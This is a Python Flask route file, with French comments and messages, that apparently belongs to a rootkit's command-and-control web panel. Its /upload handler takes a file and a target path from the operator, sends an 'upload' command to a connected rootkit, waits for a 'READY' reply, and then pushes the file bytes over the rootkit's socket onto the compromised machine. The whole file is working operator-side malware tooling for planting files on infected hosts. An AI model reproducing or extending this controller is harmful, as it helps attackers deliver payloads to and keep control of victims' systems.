from app import app
import config as cfg
from flask import flash, render_template, redirect, url_for, request, session
from werkzeug.utils import secure_filename
import os
from utils.server import TCPServer

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Aucun fichier sélectionné.', 'error')
            return redirect(request.url)

        file = request.files['file']
        remote_path = request.form.get('remote_path')

        if file.filename == '':
            flash('Nom de fichier vide.', 'error')
            return redirect(request.url)

        if not remote_path:
            flash('Chemin distant requis.', 'error')
            return redirect(request.url)

        filename = secure_filename(file.filename)
        file_data = file.read()

        try:
            # 1. Envoie la commande au rootkit
            size = len(file_data)
            command = f"upload {remote_path} {size}"
            response = cfg.rootkit_connexion.send_to_client(command)

            if response is None:
                flash("Aucune réponse du rootkit.", "error")
                return redirect(request.url)

            if response.strip().upper() != "READY":
                flash(f"Refus du rootkit : {response.strip()}", "error")
                return redirect(request.url)

            flash(f"✅ Rootkit prêt pour l'upload vers {remote_path}", "success")

            # 2. Envoi binaire chiffré du fichier
            success = cfg.rootkit_connexion._network_handler.send(
                cfg.rootkit_connexion._client_socket,
                file_data
            )

            if not success:
                flash("❌ Échec de l’envoi du fichier.", 'error')
            else:
                flash("📤 Fichier envoyé avec succès !", 'success')

        except Exception as e:
            flash(f"Erreur lors de l’envoi : {e}", 'error')
            return redirect(request.url)

    return render_template('upload.html')
